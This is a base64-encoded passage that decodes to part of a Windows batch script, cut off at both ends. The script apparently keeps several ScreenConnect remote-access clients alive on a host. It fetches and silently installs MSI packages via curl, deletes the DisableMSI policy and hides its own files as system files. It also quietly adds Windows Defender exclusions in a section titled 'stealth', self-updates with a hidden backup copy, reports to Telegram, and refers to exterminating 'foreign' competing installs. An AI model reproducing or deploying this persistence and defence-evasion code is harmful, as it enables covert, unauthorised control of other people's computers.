c2kgIiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0K
ICByZW0gcHJlZmVyIHdvcmtlci1jYWNoZWQgLnd1Y2FjaGVccGtnLm1zaSAoc2FtZSBiaW5hcnkg
YXMgZGVwbG95KQ0KICBhdHRyaWIgLWggLXMgLXIgIiVNU0lDQUNIRSUiID5udWwgMj4mMQ0KICBm
b3IgJSVGIGluICgiJU1TSUNBQ0hFJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICBl
Y2hvIHd1Y2FjaGVfcGtnX3JldHJ5Pj4iJUxPRyUiDQogICAgYXR0cmliIC1oIC1zIC1yICIlTVNJ
JSIgPm51bCAyPiYxDQogICAgY29weSAveSAiJU1TSUNBQ0hFJSIgIiVNU0klIiA+bnVsIDI+JjEN
CiAgKQ0KICBmb3IgJSVGIGluICgiJU1TSSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQog
ICAgZWNobyBjYWNoZSByZXRyeSBpbnN0YWxsPj4iJUxPRyUiDQogICAgY2FsbCA6Tm9Nc2lQb2xp
Y3kNCiAgICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJP
T1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0KICAg
IHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQogICAgZWNobyBjYWNoZSBtc2lleGVjIGV4aXQ9
IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgaWYgIiFNU0lFWElUISI9PSIxNjE4IiAoDQogICAgICB0
aW1lb3V0IC90IDMwIC9ub2JyZWFrID5udWwNCiAgICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4g
L25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1z
aV9oZWFsMi5sb2ciID5udWwgMj4mMQ0KICAgICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISIN
CiAgICAgIGVjaG8gY2FjaGVfcmV0cnkxNjE4X2V4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAg
KQ0KICAgIGNhbGwgOldhaXRTdmMNCiAgKQ0KKQ0KY2FsbCA6UmVzdG9yZUFsdA0KaWYgIiVJTlNU
QUxMRUQlIj09IjAiICgNCiAgaWYgZXhpc3QgIiVXRCVcbXNpX2hlYWwubG9nIiAoDQogICAgZWNo
byAtLS0gbXNpX2hlYWwubG9nIHRhaWwgLS0tPj4iJUxPRyUiDQogICAgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICclV0QlXG1zaV9oZWFsLmxvZycgLVRhaWwgMTAiID4+IiVMT0clIiAyPiYxDQogICkNCiAgaWYg
bm90IGRlZmluZWQgTVNJRVhJVCBzZXQgIk1TSUVYSVQ9ZmV0Y2gtZmFpbCINCiAgcG93ZXJzaGVs
bCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxk
ICVNT05WRVIlIC1FeHRyYSAibXNpLWZhaWxlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUg
RkFJTCAiTVNJIGluc3RhbGwgZmFpbGVkIG9uIGFsbCBzb3VyY2VzIChtc2lleGVjIGV4aXQgJU1T
SUVYSVQlKSINCikgZWxzZSAoDQogIGVjaG8gc3ZjIHJlc3RvcmVkPj4iJUxPRyUiDQogIHBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1C
dWlsZCAlTU9OVkVSJSAtRXh0cmEgInJlc3RvcmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0
ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVjdCByZWluc3RhbGxlZCBPSyINCikNCg0KOkFmdGVySGVh
bA0KcmVtIE0xNjogQUxUIHByZXNlbnQtYnV0LXN0b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBh
aXItYnktR1VJRCAoZXZlcnkgdGljaykNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQog
IGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBhbHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWly
Pj4iJUxPRyUiDQogICAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUp
IiA+bnVsIDI+JjENCiAgICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAl
KSIgPm51bCAyPiYxDQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgICBzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVs
DQogICAgaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29y
a0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KKQ0KcmVtIE0xNzogQUxUIHNlcnZpY2Ug
ZW50cnkgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkIC0+IHJlcGFpci1ieS1HVUlEIGV2
ZXJ5IHRpY2sNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVs
IDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIGVjaG8gYWx0X21pc3NpbmdfdHJ5X3JlcGFpcj4+
IiVMT0clIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9m
aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
d25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUi
ID4+IiVMT0clIiAyPiYxDQopDQpyZW0gKGV4dGVybWluYXRpb24gYWxyZWFkeSByYW4gcHJlLWhl
YWwgaW4gW0VdOyBmb3JlaWduIHN1cnZpdm9ycyBjb3VudGVkIHRoZXJlKQ0KDQpyZW0g4pSA4pSA
IFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gp
IOKUgOKUgA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAidHJ5IHsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9u
UGF0aCAnJVdEJScsJyVFVEwlJyAtRXJyb3JBY3Rpb24gU3RvcCB9IGNhdGNoIHt9IiA+bnVsIDI+
JjENCg0KcmVtIOKUgOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIANCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChU
ZXN0LVBhdGggJyVXRCVcb3duX3NlY3VyZS5jbWQnKSAtYW5kICgoIC1ub3QgKFRlc3QtUGF0aCAn
JVdEJVxzZWMuZmxhZycpKSAtb3IgKCgoR2V0LURhdGUpIC0gKEdldC1JdGVtIC1MaXRlcmFsUGF0
aCAnJVdEJVxzZWMuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsSG91cnMgLWdlIDIpKSl7IGV4
aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBl
Y2hvIHBlcmlvZGljIHJlLXNlY3VyZT4+IiVMT0clIg0KICBjYWxsICIlV0QlXG93bl9zZWN1cmUu
Y21kIiA+PiIlTE9HJSIgMj4mMQ0KICBlY2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciDQopDQoNCnJl
bSDilIDilIAgW0cyXSBlbnN1cmUgZ3J5eGEgU0MgKG1haW4gYmVzaWRlIHNldnJ6KSDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnNldCAiR1JZ
WEFfT0s9MCINCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiIHwg
ZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEi
DQppZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIGVjaG8gZ3J5eGEgaGVhbCBiZWdpbj4+IiVMT0cl
Ig0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+
JjENCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICAgIHRpbWVvdXQgL3QgNSAvbm9i
cmVhayA+bnVsDQogICkNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFf
RlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAg
IHNldCAiR1JZWEFfT0s9MSINCiAgKSBlbHNlIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAo
DQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9s
aWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIl
R1JZWEFfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCiAgICB0aW1lb3V0IC90
IDYgL25vYnJlYWsgPm51bA0KICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdS
WVhBX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICAgIGlmIG5vdCBlcnJvcmxldmVsIDEg
c2V0ICJHUllYQV9PSz0xIg0KICApDQopDQppZiAiJUdSWVhBX09LJSI9PSIwIiAoDQogIHNldCAi
R1JFRz11bmtub3duIg0KICBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZm9yIC9mICJ1c2Vi
YWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0
aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0
aW9uIHJlZ2lzdGVyZWQgLUZwICIlR1JZWEFfRlAlIiAtV29ya0RpciAiJVdEJSJgKSBkbyBzZXQg
IkdSRUc9JSVSIg0KICBpZiAvSSBub3QgIiFHUkVHISI9PSJ5ZXMiICgNCiAgICBlY2hvIGdyeXhh
X2luc3RhbGxfYmVnaW4+PiIlTE9HJSINCiAgICBpZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJD
VVJMPWN1cmwuZXhlIg0KICAgICIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3Qt
dGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAiJU1TSV9HJS50bXAiICIlTVNJX0dSWVhBJSIg
Pj4iJUxPRyUiIDI+JjENCiAgICBmb3IgJSVGIGluICgiJU1TSV9HJS50bXAiKSBkbyBpZiAlJX56
RiBHVFIgMTAwMDAwMCAoDQogICAgICBtb3ZlIC95ICIlTVNJX0clLnRtcCIgIiVNU0lfRyUiID5u
dWwgMj4mMQ0KICAgICAgY29weSAveSAiJU1TSV9HJSIgIiVNU0lDQUNIRV9HJSIgPm51bCAyPiYx
DQogICAgICBjYWxsIDpOb01zaVBvbGljeQ0KICAgICAgbXNpZXhlYyAvaSAiJU1TSV9HJSIgL3Fu
IC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgPj4iJUxPRyUiIDI+
JjENCiAgICAgIHRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQogICAgKQ0KICAgIGRlbCAvZiAv
cSAiJU1TSV9HJS50bXAiID5udWwgMj4mMQ0KICApIGVsc2UgKA0KICAgIGlmIGV4aXN0ICIlV0Ql
XG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFp
ciAtRnAgIiVHUllYQV9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KICApDQog
IHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0K
ICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJV
Tk5JTkciID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQopDQoN
CnJlbSDilIDilIAgW0hdIHF1aWV0IGRpZ2VzdCAoc2tpcCBoZWFsdGh5IGhvc3RzIOKAlCB3YXMg
Zmxvb2RpbmcgVGVsZWdyYW0pIOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBv
d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUi
IC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+JjENCnNldCAiTkVFRF9IQj0wIg0KaWYgIiVQUklNX09L
JSI9PSIwIiBzZXQgIk5FRURfSEI9MSINCmlmICVGT1JFSUdOX0xFRlQlIEdUUiAwIHNldCAiTkVF
RF9IQj0xIg0KaWYgIiVHUllYQV9PSyUiPT0iMCIgc2V0ICJORUVEX0hCPTEiDQppZiAiJU5FRURf
SEIlIj09IjAiICgNCiAgZWNobyBoYl9za2lwX2hlYWx0aHk+PiIlTE9HJSINCikgZWxzZSAoDQog
IHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0
LVBhdGggJyVIQkZMQUclJykgLWFuZCAoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxp
dGVyYWxQYXRoICclSEJGTEFHJScpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgMzYw
KXsgZXhpdCAwIH0gZWxzZSB7IGV4aXQgMSB9IiA+bnVsIDI+JjENCiAgaWYgZXJyb3JsZXZlbCAx
ICgNCiAgICBlY2hvIGhiPiVIQkZMQUclDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQu
cHMxIiAtU3RhdGUgSEIgLU1vZGUgY29tcGFjdCAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICFDT1VO
VCEgPm51bCAyPiYxDQogICAgZWNobyBkaWdlc3QgSEIgc2VudD4+IiVMT0clIg0KICApDQopDQoN
CnJlbSDilIDilIAgW0ldIHNlbGYtdXBkYXRlIGFwcGx5IChsYXN0IHRoaW5nIHRoaXMgdGljaykg
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiAiJVNFTEZfVVBE
JSI9PSIxIiAoDQogIGVjaG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9HJSINCiAgYXR0cmliIC1o
IC1zIC1yICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCiAgbW92ZSAveSAiJVdEJVxvd25f
bW9uLm5leHQiICIlV0QlXG93bl9tb24uY21kIiA+bnVsIDI+JjENCikNCnJlbSBrZWVwIGR1YWwt
cGF0aCBiYWNrdXAgaW4gc3luYyBldmVyeSB0aWNrDQppZiBub3QgZXhpc3QgIiVFVEwlIiBta2Rp
ciAiJUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcb3duX21vbi5jbWQiICgNCiAgYXR0
cmliIC1oIC1zIC1yICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkgL3kgIiVX
RCVcb3duX21vbi5jbWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQopDQpkZWwgL2Yg
L3EgIiVNVVRFWCUiID5udWwgMj4mMQ0KDQplY2hvIHRpY2sgZG9uZTogcHJpbT0lUFJJTV9PSyUg
Z3J5eGE9JUdSWVhBX09LJSBhbHQ9JUFMVF9PSyUgZm9yZWlnbj0lRk9SRUlHTl9MRUZUJT4+IiVM
T0clIg0KZW5kbG9jYWwNCmV4aXQgL2IgMA0KDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIGhlbHBlcnMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQo6SW5zdGFsbE1zaQ0KcmVtICUxPXVybCAlMj10YWcNCnNldCAi
VVJMPSV+MSINCnNldCAiVEFHPSV+MiINCmVjaG8gWyVUQUclXSBmZXRjaCAlVVJMJT4+IiVMT0cl
Ig0KIiVDVVJMJSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tbWF4
LXRpbWUgMzAwIC1vICIlTVNJJS50bXAiICIlVVJMJSIgPj4iJUxPRyUiIDI+JjENCmZvciAlJUYg
aW4gKCIlTVNJJS50bXAiKSBkbyBpZiAlJX56RiBMRVEgMTAwMDAwMCAoDQogIGVjaG8gWyVUQUcl
XSBmZXRjaCBmYWlsZWQ+PiIlTE9HJSINCiAgZGVsIC9mIC9xICIlTVNJJS50bXAiID5udWwgMj4m
MQ0KICBleGl0IC9iIDENCikNCm1vdmUgL3kgIiVNU0klLnRtcCIgIiVNU0klIiA+bnVsIDI+JjEN
CmNhbGwgOk5vTXNpUG9saWN5DQpyZW0gTTEzOiBzdGFsZSBwcmltYXJ5IGRpciAoc2VydmljZSBk
ZWxldGVkLCBwcm9kdWN0IHVucmVnaXN0ZXJlZCkgYnJlYWtzDQpyZW0gdGhlIFNDIGluc3RhbGxl
ciBjdXN0b20gYWN0aW9uIC0gY2xlYXIgaXQgYmVmb3JlIGluc3RhbGxpbmcNCnNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVs
IDEgaWYgZXhpc3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgKA0K
ICBlY2hvIHN0YWxlX3ByaW1hcnlfZGlyX2NsZWFuPj4iJUxPRyUiDQogIHJtZGlyIC9zIC9xICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KKQ0KZWNo
byBbJVRBRyVdIG1zaWV4ZWMgaW5zdGFsbD4+IiVMT0clIg0KbXNpZXhlYyAvaSAiJU1TSSUiIC9x
biAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVc
bXNpX2hlYWwubG9nIiA+bnVsIDI+JjENCnNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQplY2hv
IFslVEFHJV0gbXNpZXhlYyBleGl0PSFNU0lFWElUIT4+IiVMT0clIg0KaWYgIiFNU0lFWElUISI9
PSIxNjE4IiAoDQogIGVjaG8gWyVUQUclXSBtc2lfYnVzeV9yZXRyeT4+IiVMT0clIg0KICB0aW1l
b3V0IC90IDMwIC9ub2JyZWFrID5udWwNCiAgbXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0
YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwy
LmxvZyIgPm51bCAyPiYxDQogIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQogIGVjaG8gWyVU
QUclXSBtc2lleGVjX3JldHJ5IGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQopDQpjYWxsIDpXYWl0
U3ZjDQpleGl0IC9iIDANCg0KOlJlcGFpclJlZ2lzdGVyZWQNCnJlbSAlMT1maW5nZXJwcmludCAt
IHNlcnZpY2UgZGVsZXRlZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkOiByZXBhaXIgYnkgR1VJRC4N
CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxDQppZiBub3Qg
ZXJyb3JsZXZlbCAxIGV4aXQgL2IgMA0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBl
eGl0IC9iIDENCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlv
blBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1G
cCAiJX4xIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCmNhbGwgOldhaXRTdmMNCmV4
aXQgL2IgMA0KDQo6UmVzdG9yZUFsdA0KcmVtIEFMVCBzZXJ2aWNlIGdvbmUgYnV0IHN0aWxsIHJl
Z2lzdGVyZWQgKFNDLWZhbWlseSBtc2lleGVjIHNpZGUgZWZmZWN0KSAtIHJlcGFpciBpdCB0b28u
DQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQpp
ZiBub3QgZXJyb3JsZXZlbCAxIGV4aXQgL2IgMA0KZWNobyBhbHQgbWlzc2luZyAtIHJlcGFpciBh
dHRlbXB0Pj4iJUxPRyUiDQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIg
IiVXRCUiID4+IiVMT0clIiAyPiYxDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVB
TFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAi
QUxUX09LPTEiDQpleGl0IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJIS0xNXFNP
RlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1T
SSAvZiA+bnVsIDI+JjENCnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9z
b2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92
IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleGl0IC9iIDANCg0K
OldhaXRTdmMNCnNldCAiVFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJv
cmxldmVsIDEgKA0KICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1fT0s9MSINCiAgZXhp
dCAvYiAwDQopDQpzZXQgL2EgVFJJRVMrPTENCmlmICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQ0K
cGluZyAxMjcuMC4wLjEgLW4gNyA+bnVsIDI+JjENCmdvdG8gOldhaXRMb29wDQoNCjpUZ1N0YXRl
DQpzZXQgIk5FV1NUQVRFPSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAiT0xEU1RBVEU9Ig0KaWYg
ZXhpc3QgIiVTVEFURSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFURSUiDQpyZW0gZmFsc2UgRE9X
TiBhZnRlciByZWJvb3QgcmFjZTogcHJpbWFyeSBhbHJlYWR5IFJ1bm5pbmcg4oCUIGRvIG5vdCBz
cGFtDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBl
cnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc2tpcF9kb3duX2FscmVhZHlfcnVubmluZz4+IiVM
T0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQpyZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dO
L0ZBSUw6IG1heCAxIGFsZXJ0IHBlciA2aCB3aGlsZSBzdHVjaw0KaWYgL0kgIiVORVdTVEFURSUi
PT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRkFJTCIg
Z290byA6TWF5YmVTdXBwcmVzcw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5YmVTdXBwcmVzcw0KaWYg
L0kgIiVORVdTVEFURSUiPT0iJU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdfc2VudC5mbGFn
IiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlm
KChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdfc2Vu
dC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzNjApe2V4aXQgMH1lbHNl
e2V4aXQgMX0iID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRn
X3N1cHByZXNzZWRfJU5FV1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6
U2VuZEFsZXJ0DQplY2hvICVORVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdf
c2VudC5mbGFnIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJU5FV1NU
